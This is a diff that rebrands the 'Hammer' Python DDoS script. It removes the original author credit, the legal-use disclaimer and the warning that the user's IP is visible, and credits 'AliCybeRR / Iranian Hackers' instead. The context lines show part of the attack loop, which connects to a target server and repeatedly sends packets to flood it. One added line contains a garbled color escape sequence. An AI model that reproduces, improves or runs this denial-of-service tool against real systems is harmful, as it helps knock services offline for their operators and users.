@@ -2,8 +2,8 @@
 # -*- coding: utf-8 -*-
 
 # python 3.3.2+ Hammer Dos Script v.1
-# by Can Yalçın
-# only for legal purpose
+# by AliCybeRR
+# only for AliCybeRR / PlusClay
 
 
 from queue import Queue
@@ -49,10 +49,10 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! hammering--> \033[0m")
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--DDos Start  By AliCybeRR--> \033[0m")
 			else:
 				s.shutdown(1)
-				print("\033[91mshut<->down\033[0m")
+				print("\033[91off shod<->down\033[0m")
 			time.sleep(.1)
 	except socket.error as e:
 		print("\033[91mno connection! server maybe down\033[0m")
@@ -75,14 +75,12 @@ def dos2():
 
 
 def usage():
-	print (''' \033[92m	Hammer Dos Script v.1 http://www.canyalcin.com/
-	It is the end user's responsibility to obey all applicable laws.
-	It is just for server testing script. Your ip is visible. \n
-	usage : python3 hammer.py [-s] [-p] [-t]
-	-h : help
-	-s : server ip
+	print ('''  Ddos Script power By AliCybeRR / By Iranian Hackers
+	please subscribe my github chanel
+	usage : python AliCybeRR.py  [-s] [-p] [-t]
+	-s : server ip 
 	-p : port default 80
-	-t : turbo default 135 \033[0m''')
+	-t : turbo default 135''')
 	sys.exit()
 
 
